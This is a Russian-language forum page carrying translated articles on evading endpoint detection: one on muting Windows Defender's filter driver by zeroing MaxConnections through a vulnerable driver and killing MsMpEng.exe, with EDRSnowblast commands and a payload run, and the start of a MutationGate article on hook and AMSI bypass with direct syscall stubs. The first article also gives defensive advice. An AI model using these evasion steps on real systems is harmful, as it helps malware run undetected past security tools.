			alt="1746796787570.png"
			title="1746796787570.png"
			width="1024" height="480" loading="lazy" />
	</div><br />
<br />
<b>Исследование внутреннего общения EDR</b><br />
<br />
Из пространства памяти ядра Windows, EDR_Driver.sys может использовать несколько API ядра Windows (колбэки) для мониторинга, а затем блокировки вредоносных системных активностей.<br />
<br />
Например, API-функция PsSetCreateProcessNotifyRoutine может быть использована для генерации следующих сообщений &quot;журналов мониторинга&quot; благодаря механизму колбэка ядра:<br />
– Журнал = создан новый процесс (PID 5376) с командной строкой C:\notepad.exe<br />
<br />
Из пользовательского пространства памяти, EDR_Process.exe может отправлять запросы на действия драйверу и получать от него информацию. Например, &quot;Запрос на действие&quot;, поступающий из консоли безопасности EDR, может быть:<br />
<br />
– Действие = добавить в черный список C:\notepad.exe<br />
<br />
На рисунке ниже я попытался отобразить общие колбэки ядра Windows, используемые в целях мониторинга.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796797631.png"
		data-src="https://osint42.org/attachments/1746796797631-png.330/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796797631-png.330/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796797631.png"
			title="1746796797631.png"
			width="1024" height="606" loading="lazy" />
	</div><br />
<br />
Вопрос, который возникает после создания этого резюме, заключается в том, как избежать взаимодействия между EDR_process.exe и EDR_driver.sys? Ослепление EDR с использованием известных техник<br />
<br />
<b><u>Наиболее распространенные техники ослепления датчиков EDR включают в себя:</u></b><br />
<ul>
<li data-xf-list-type="ul">Удаление хуков DLL (пространство пользователя)</li>
<li data-xf-list-type="ul">Удаление колбэков ядра (пространство ядра)</li>
</ul>Поскольку мы сосредоточены только на части EDR, работающей в ядре, вот визуализация того, что происходит, когда вы удаляете колбэки ядра:<br />
<br />
ДО обнуления адреса колбэка EDR:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796807305.png"
		data-src="https://osint42.org/attachments/1746796807305-png.331/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796807305-png.331/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796807305.png"
			title="1746796807305.png"
			width="568" height="264" loading="lazy" />
	</div><br />
<br />
ПОСЛЕ обнуления адреса колбэка EDR:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796814683.png"
		data-src="https://osint42.org/attachments/1746796814683-png.332/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796814683-png.332/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796814683.png"
			title="1746796814683.png"
			width="499" height="338" loading="lazy" />
	</div><br />
<br />
Мы не будем углубляться в детали по этой теме, она рассмотрена в Дополнительно: Уклоняемся от поведенческого детекта антивируса и EDR | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Но вы можете заметить на рисунке ниже, что каждый раз, когда вы обнуляете адрес колбэка EDR, это означает, что больше никаких уведомлений (нет &quot;рассылки&quot;) не будет отправлено от Windows к EDR_Driver.sys. В итоге, никакие журналы событий не будут отправлены в EDR_Process.exe (и на консоль аналитика безопасности) больше!<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797240133.png"
		data-src="https://osint42.org/attachments/1746797240133-png.336/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797240133-png.336/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797240133.png"
			title="1746797240133.png"
			width="1024" height="606" loading="lazy" />
	</div><br />
<br />
<b>Ослепление EDR с использованием альтернативного подхода</b><br />
<br />
В ходе моих исследований по этой теме я задавался вопросом, как избежать взаимодействия между EDR_process.exe и EDR_driver.sys без каких-либо изменений колбэков? Можем ли мы предотвратить обмен &quot;сообщениями&quot; между EDR_process.exe и EDR_Driver.sys?<br />
<br />
Мы могли бы представить другой подход, используя эту графическую иллюстрацию:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797250650.png"
		data-src="https://osint42.org/attachments/1746797250650-png.337/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797250650-png.337/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797250650.png"
			title="1746797250650.png"
			width="1024" height="606" loading="lazy" />
	</div><br />
<br />
Пока я пытался исследовать с использованием Windbg, Ярден Шафир написал замечательный блог<a href="https://windows-internals.com/investigating-filter-communication-ports/" target="_blank" class="link link--external" rel="noopener"> о Исследовании Портов Коммуникационных Фильтров</a>, который действительно помог.<br />
<br />
Я обнаружил некоторые структуры данных Windows, которые манипулируются во время настройки связи между приложением и драйвером.<br />
Структура данных с названием FLT_SERVER_PORT_OBJECT привлекла мое внимание, потому что, похоже, содержала интересные поля, посмотрите, согласны ли вы:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797259754.png"
		data-src="https://osint42.org/attachments/1746797259754-png.338/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797259754-png.338/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797259754.png"
			title="1746797259754.png"
			width="719" height="432" loading="lazy" />
	</div><br />
<br />
Когда я увидел это, первый вопрос, который пришел мне в голову, был о том, что может произойти, если мы установим MaxConnections равным нулю?<br />
<br />
Эта структура данных инициализируется с использованием API драйверов Windows под названием FltCreateCommunicationPort:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS FLTAPI FltCreateCommunicationPort(
  [in]           PFLT_FILTER            Filter,
  [out]          PFLT_PORT              *ServerPort,
  [in]           POBJECT_ATTRIBUTES     ObjectAttributes,
  [in, optional] PVOID                  ServerPortCookie,
  [in]           PFLT_CONNECT_NOTIFY    ConnectNotifyCallback,
  [in]           PFLT_DISCONNECT_NOTIFY DisconnectNotifyCallback,
  [in, optional] PFLT_MESSAGE_NOTIFY    MessageNotifyCallback,
  [in]           LONG                   MaxConnections
);</code></pre>
	</div>
</div><br />
<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltcreatecommunicationport" target="_blank" class="link link--external" rel="noopener">Microsoft documentation</a> вот-что говорит:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797271132.png"
		data-src="https://osint42.org/attachments/1746797271132-png.339/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797271132-png.339/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797271132.png"
			title="1746797271132.png"
			width="1024" height="269" loading="lazy" />
	</div><br />
<br />
Что мы можем вывести? Если нам удастся сбросить MaxConnections до нуля, это только предотвратит возникновение новых соединений. Давайте приступим к следующему плану атаки:<br />
<br />
Шаг 1: сброс значения MaxConnections<br />
Шаг 2: заставить EDR_Process.exe перезапуститься (вероятно, потребуются высокие привилегии, скорее всего NT SYSTEM)<br />
Шаг 3: наблюдать за поведением EDR<br />
<br />
<b>Шаг 1: сброс значения MaxConnections</b><br />
<br />
Первое необходимое условие для этого шага - наличие примитива чтения/записи в режиме ядра, который мы можем использовать для установки значения в 0. Для этого мы будем использовать технику BYOVD (Bring Your Own Vulnerable Driver - Принеси свой уязвимый драйвер) - Техника описана здесь. В качестве второго условия нам нужно найти адрес поля MaxConnections в памяти ядра, верно? Давайте посмотрим, как мы можем получить этот адрес!<br />
<br />
Структура fltmgr!_FLT_SERVER_PORT_OBJECT, о которой мы говорили ранее, может быть достигнута через структуру fltmgr!_FLT_FILTER, которая, в свою очередь, может быть достигнута через структуру fltmgr!_FLTP_FRAME, которая может быть достигнута через структуру FLTMGR!_GLOBALS, к которой можно добраться через драйвер FltMgr.sys.<br />
<br />
Базовый адрес этого модуля ядра можно получить из пользовательского режима, используя Windows API NtQuerySystemInformation.<br />
<br />
Мы можем найти адрес MaxConnections, проходя через структуры данных ядра Windows,<b><u> начиная от драйвера FltMgr.sys до этого поля!</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797280601.png"
		data-src="https://osint42.org/attachments/1746797280601-png.340/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797280601-png.340/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797280601.png"
			title="1746797280601.png"
			width="1024" height="283" loading="lazy" />
	</div><br />
<br />
<b><u>Вот как это выглядит, когда вы хотите взглянуть на детали, касающиеся драйвера ядра Windows Defender:</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797287371.png"
		data-src="https://osint42.org/attachments/1746797287371-png.341/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797287371-png.341/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797287371.png"
			title="1746797287371.png"
			width="871" height="286" loading="lazy" />
	</div><br />
<br />
Имея знания о расположении памяти MaxConnections, мы можем использовать примитив чтения в режиме ядра, чтобы получить текущее значение, и используя примитив записи в режиме ядра, мы можем установить значение в 0.<br />
<br />
<b><u>Шаг 2: заставить EDR перезапуститься</u></b><br />
<br />
Эта фаза может быть сложной, поскольку EDR_Process.exe делает все возможное, чтобы защитить себя. Обычно эта программа запускается как служба и будет перезапускаться после ее сбоя, но это нас не беспокоит, поскольку никакое соединение не разрешено EDR_Driver.sys благодаря шагу 1 ;-)<br />
<br />
Лично я делаю эту операцию, используя свой собственный инструмент (неподписанный зловредный драйвер), который позволяет нам убивать процесс, даже если он защищен, но также возможно использовать Process Hacker (если он не в черном списке) или, что еще лучше, любые эксплуатируемые &quot;драйверы убийцы процессов&quot;.<br />
<br />
Я настоятельно рекомендую блогпост Алисы Климент-Поммере (@AliceCliment)<a href="https://alice.climent-pommeret.red/posts/process-killer-driver/" target="_blank" class="link link--external" rel="noopener"> &quot;Находка и эксплуатация драйверов убийц процессов с LOL за 3000$&quot;</a>, который охватывает эту тему!<br />
<br />
<b><u>Шаг 3: наблюдение за поведением EDR</u></b><br />
<br />
Давайте создадим вредоносное ПО (исходный код доступен на <a href="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber" target="_blank" class="link link--external" rel="noopener">ired.team</a>) с именем iwanttobeflag.exe, которое блокируется Windows Defender:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797297138.png"
		data-src="https://osint42.org/attachments/1746797297138-png.342/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797297138-png.342/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797297138.png"
			title="1746797297138.png"
			width="882" height="681" loading="lazy" />
	</div><br />
<br />
Затем мы можем проверить стандартную реакцию на наше вредоносное ПО, копируя вредоносную полезную нагрузку из общей папки на локальный диск. Это вызывает тревогу и блокируется Windows Defender, как и ожидалось: отлично!<br />
copy z:\iwanttobeflag.exe c:\<br />
<br />
Теперь у нас есть что-то, что в общем случае должно вызвать тревогу, и мы можем использовать это, чтобы проверить, заглушает ли наша техника EDR.<br />
<br />
<b>Реализация плана</b><br />
<br />
Давайте объединим все это в инструмент и проверим, могут ли наши шаги 1 и 2 нарушить оповещение, вызванное на шаге 3.<br />
<br />
Вот инструмент (EDRSnowblast):<a href="https://v1k1ngfr.github.io/edrsnowblast/" target="_blank" class="link link--external" rel="noopener">EDRSnowblast - blizzard on EDR drivers</a><br />
<br />
Давайте пройдемся по шагам на живой машине и посмотрим, что произойдет!<br />
<br />
1) перечислить драйверы (фильтры), которые загружены в память ядра и идентифицировать Windows Defender: WdFilter находится на 9-й позиции на рисунке ниже<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>EDRSnowblast.exe filter-enum --kernelmode</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797311292.png"
		data-src="https://osint42.org/attachments/1746797311292-png.343/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797311292-png.343/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797311292.png"
			title="1746797311292.png"
			width="1024" height="387" loading="lazy" />
	</div><br />
<br />
2) получить детали о фильтре WdFilter: например, MaxConnections &amp; NumberOfConnections<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>EDRSnowblast.exe filter-enum --kernelmode --filter-index 9</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797320957.png"
		data-src="https://osint42.org/attachments/1746797320957-png.344/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797320957-png.344/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797320957.png"
			title="1746797320957.png"
			width="1024" height="776" loading="lazy" />
	</div><br />
<br />
3) заглушить WdFilter: установить MaxConnections в ноль<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>EDRSnowblast.exe filter-mute --kernelmode --filter-index 9</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797331968.png"
		data-src="https://osint42.org/attachments/1746797331968-png.345/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797331968-png.345/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797331968.png"
			title="1746797331968.png"
			width="1024" height="353" loading="lazy" />
	</div><br />
<br />
4. (опционально) проверить значение MaxConnections, используя опцию --filter-enum, как было показано ранее<br />
5. определить PID процесса Windows Defender в пользовательском режиме и убить его<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>tasklist | findstr MsMpEng.exe MsMpEng.exe 2956 Services 0 206,788 K c:\pimpmypid_clt.exe /kill 2956</code></pre>
	</div>
</div>6. скопировать нашу вредоносную полезную нагрузку, созданную на шаге 3, и выполнить<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>copy z:\iwanttobeflag.exe c:
c:\iwanttobeflag.exe</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797347621.png"
		data-src="https://osint42.org/attachments/1746797347621-png.346/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797347621-png.346/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797347621.png"
			title="1746797347621.png"
			width="528" height="284" loading="lazy" />
	</div><br />
<br />
8.наслаждаться нашим успехом<br />
<br />
Если хотите, вы можете посмотреть видео демонстрации ниже.<br />
<br />
<div class="bbMediaWrapper" data-media-site-id="youtube" data-media-key="PakPq-83IEE">
	<div class="bbMediaWrapper-inner">
		<iframe src="https://www.youtube.com/embed/PakPq-83IEE?wmode=opaque"
				loading="lazy"
				width="560" height="315"
				frameborder="0" allowfullscreen="true"></iframe>
	</div>
</div><br />
Эта техника была успешно протестирована против Windows Defender и двух других поставщиков EDR.<br />
<br />
<b>Как защититься / обнаружить?</b><br />
<br />
Мы должны начать с вопроса, какие предпосылки для &quot;заглушения фильтра&quot;?<br />
<ul>
<li data-xf-list-type="ul">вы должны использовать примитив эксплойта чтения/записи ядра Windows – если вы хотите использовать BYOVD (Принеси Свой Уязвимый Драйвер), вы должны иметь SeLoadDriverPrivilege, необходимый для загрузки / выгрузки драйверов (например, локальный администратор, администратор домена, оператор печати домена)</li>
<li data-xf-list-type="ul">вы должны быть способны убивать (или перезапускать) пользовательское приложение EDR</li>
</ul>Теперь мы могли бы задаться вопросом, возможно ли для пользователей Windows защитить себя? И да, существуют некоторые меры предосторожности. Вот некоторые рекомендации:<br />
<ul>
<li data-xf-list-type="ul">применять патчи Windows: это устраняет уязвимости из ядра Windows и драйверов</li>
<li data-xf-list-type="ul">использовать Microsoft VBS (включить HVCI): как вы могли заметить, используемый вектор атаки - BYOVD. Этот вектор известен давно, и Microsoft проделала большую работу, чтобы смягчить это с помощью функций безопасности на основе виртуализации (VBS), доступных в Windows 10, Windows 11, Windows Server 2016 и более поздних версиях. Больше деталей о VBS в документации Microsoft: Безопасность на основе виртуализации (VBS)</li>
<li data-xf-list-type="ul">использовать рекомендованные Microsoft правила блокировки драйверов, <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules" target="_blank" class="link link--external" rel="noopener">доступные здесь</a></li>
<li data-xf-list-type="ul">использовать Sysmon или правила Sigma: огромный список известно уязвимых драйверов доступен на <a href="http://www.loldrivers.io/" target="_blank" class="link link--external" rel="noopener">www.loldrivers.io</a>, и этот проект предоставляет такого рода правила</li>
</ul><b>Другой вопрос:</b> могут ли поставщики EDR защитить свои драйверы от этой атаки? Да, они могут!<br />
<br />
Самое быстрое решение может быть добавление в черный список известно уязвимых драйверов, избегая их загрузки. Но у этого метода те же ограничения, что и у сигнатур AV; неизвестные уязвимые драйверы не будут блокироваться.<br />
<br />
<b>Лучшая защита может быть реализованы разработчиками (Проверка коннкета с EDR):</b><br />
<br />
- Всегда проверять, что EDR_process.exe может подключиться к порту связи EDR_driver.sys. Пример кода, который может достичь этого:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hPort;
HRESULT hr = ::FilterConnectCommunicationPort(L&quot;\\secureEDR&quot;,0, nullptr, 0, nullptr, &amp;hPort);

if (FAILED(hr)) {
   printf(&quot;Error connecting to EDR_driver.sys ! (HR=0x%08X)\n&quot;, hr);
   if (hr == 0x800704D6) {
      printf(&quot;ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\n&quot;);
   }
}
// Other common errors you should check are
// ERROR_BAD_PATHNAME (HR=0x800700A1)
// E_FILE_NOT_FOUND (HR=0x80070002)
// E_ACCESSDENIED (HR=0x80070005)
// ERROR_INVALID_NAME (HR=0x8007007B)</code></pre>
	</div>
</div><br />
- Статический KDP: драйвер EDR должен вызвать API MmProtectDriverSection для защиты секции своего образа<br />
<br />
- Динамический KDP: позволяет драйверу выделять и инициализировать память только для чтения, используя услуги, предоставляемые защищенным пулом, который управляется защищенным ядром, используя API ExAllocatePool3.<br />
Больше деталей о KDP в посте Андреа Аллиеви: <a href="https://www.microsoft.com/en-us/security/blog/2020/07/08/" target="_blank" class="link link--external" rel="noopener">Введение в защиту данных ядра</a>.</div>
						

							<h2>MutationGate - Новый подход работы с сисколами</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746797822236.png"
		data-src="https://osint42.org/attachments/1746797822236-png.347/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797822236-png.347/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797822236.png"
			title="1746797822236.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
Перевод:<a href="https://winslow1984.com/books/malware/page/mutationgate" target="_blank" class="link link--external" rel="noopener">MutationGate | Winslow Blog</a><br />
<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-motivatsiya"></a>Мотивация&#8203;<a class="hoverLink" href="#-motivatsiya" title="Постоянная ссылка"></a></h4>Учитывая, что встроенные хуки являются основным методом обнаружения, используемым продуктами EDR, обход их является для меня интересной темой.<br />
<br />
Что касается обхода встроенных хуков, установленных EDR, уже существует довольно много доступных подходов. Хотя некоторые из ранних подходов очень легко обнаруживаются, существуют и несколько зрелых подходов.<br />
Тем не менее, <b><u>я считаю, что было бы очень интересно найти новый подход к обходу хуков</u></b>, надеюсь, это принесет некоторые улучшения или преимущества.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-vstroyennyi-khuk"></a>Встроенный хук&#8203;<a class="hoverLink" href="#-vstroyennyi-khuk" title="Постоянная ссылка"></a></h3>Продукты EDR (Endpoint Detection and Response) часто размещают встроенные хуки на NTAPI, которые обычно используются в вредоносном ПО, таких как NtAllocateVirtualMemory, NtUnmapViewOfSection, NtWriteVirtualMemory и других. Это связано с тем, что NTAPI является мостом между пользовательским пространством и пространством ядра.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797831662.png"
		data-src="https://osint42.org/attachments/1746797831662-png.348/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797831662-png.348/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797831662.png"
			title="1746797831662.png"
			width="501" height="556" loading="lazy" />
	</div><br />
<br />
Например, NtAllocateVirtualMemory является версией NTAPI функции VirtualAlloc. Размещая безусловную команду перехода в NTAPI, независимо от того, вызывает ли программа Win32 API или NTAPI, EDR способен проверить вызов и далее определить его намерение.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797837846.png"
		data-src="https://osint42.org/attachments/1746797837846-png.349/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797837846-png.349/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797837846.png"
			title="1746797837846.png"
			width="1101" height="615" loading="lazy" />
	</div><br />
<br />
Следующие скриншоты показывают, как выглядит хуки на NTAPI:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797844255.png"
		data-src="https://osint42.org/attachments/1746797844255-png.350/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797844255-png.350/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797844255.png"
			title="1746797844255.png"
			width="840" height="725" loading="lazy" />
	</div><br />
<br />
А если на NTAPI нет хука, мы можем заметить очень последовательный шаблон, который показывает, как выглядит заглушка системного вызова:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797851399.png"
		data-src="https://osint42.org/attachments/1746797851399-png.351/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797851399-png.351/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797851399.png"
			title="1746797851399.png"
			width="1148" height="206" loading="lazy" />
	</div><br />
<br />
Хотя EDR имеет несколько уровней обнаружения, встроенный хук является одним из основных.<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-apparatnaya-tochka-ostanova"></a>Аппаратная точка останова&#8203;<a class="hoverLink" href="#-apparatnaya-tochka-ostanova" title="Постоянная ссылка"></a></h3>В моей статье &quot;Обход AMSI на Windows 11&quot; (<a href="https://medium.com/@gustavshen/bypass-amsi-on-windows-11-75d231b2cac6" target="_blank" class="link link--external" rel="noopener">Bypass AMSI on Windows 11</a>) я обнаружил, что если R8 равен 0 при вызове AmsiScanBuffer, AMSI можно обойти. Однако я отметил, что использовать этот обход без WinDBG непросто.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797864885.png"
		data-src="https://osint42.org/attachments/1746797864885-png.352/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797864885-png.352/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797864885.png"
			title="1746797864885.png"
			width="927" height="976" loading="lazy" />
	</div><br />
<br />
На самом деле, это возможно, используя аппаратную точку останова. В этой статье (<a href="https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/" target="_blank" class="link link--external" rel="noopener">In-Process Patchless AMSI Bypass - Ethical Chaos</a>) объясняется, как использовать аппаратную точку останова для обхода AMSI без патчей.<br />
Это достигается путем установки RAX в 0, изменения аргумента результата сканирования AMSI и установки RIP как адреса возврата, когда выполнение передается функции AmsiScanBuffer. В нашем случае, нам просто нужно установить R8 в 0.<br />
Я не буду здесь подробно объяснять основные знания о аппаратной точке останова и VEH, так как вы можете ознакомиться с ними в статье, а общая идея более важна.<br />
<br />
Также на форуме есть статья:Дополнительно: Обход AMSI при помощи хардварных точек останова | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-nekotoryye-iz-sushchestvuyushchikh-podkhodov"></a>Некоторые из существующих подходов&#8203;<a class="hoverLink" href="#-nekotoryye-iz-sushchestvuyushchikh-podkhodov" title="Постоянная ссылка"></a></h3>Следующие подходы могут быть использованы для обхода встроенного хука. Учитывая, что уже существует множество статей, подробно описывающих их, давайте кратко рассмотрим некоторые из подходов, которые могут обойти встроенный хук.<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-pryamoi-sistemnyi-vyzov"></a>Прямой системный вызов&#8203;<a class="hoverLink" href="#-pryamoi-sistemnyi-vyzov" title="Постоянная ссылка"></a></h4>Каждая Nt-версия Win32 API, такая как NtAllocateVirtualMemory, требует только 4 инструкции для работы, этот набор инструкций называется заглушкой системного вызова (syscall stub). Единственное различие между различными NTAPI - это значение их номера системного вызова.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>mov r10, rcx
mov rax, [SSN]
syscall
ret</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797901049.png"
		data-src="https://osint42.org/attachments/1746797901049-png.353/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797901049-png.353/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797901049.png"
			title="1746797901049.png"
			width="934" height="186" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797908279.png"
		data-src="https://osint42.org/attachments/1746797908279-png.354/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797908279-png.354/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797908279.png"
			title="1746797908279.png"
			width="933" height="185" loading="lazy" />
	</div><br />
<br />
<b><u>Вот пример реализации этого подхода:</u></b><br />
<br />
В файле .asm определите заглушку системного вызова для NtAllocateVirtualMemory:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>.code

&lt;...Other Stubs...&gt;

NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h
    syscall
    ret
NtAllocateVirtualMemory ENDP

&lt;...Other Stubs...&gt;

end</code></pre>
	</div>
</div><br />
Внутри файла заголовка или c/cpp файла используйте макрос EXTERN_C для связывания определения функции с ассемблерным кодом заглушки системного вызова, имя должно быть одинаковым.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);</code></pre>
	</div>
</div><br />
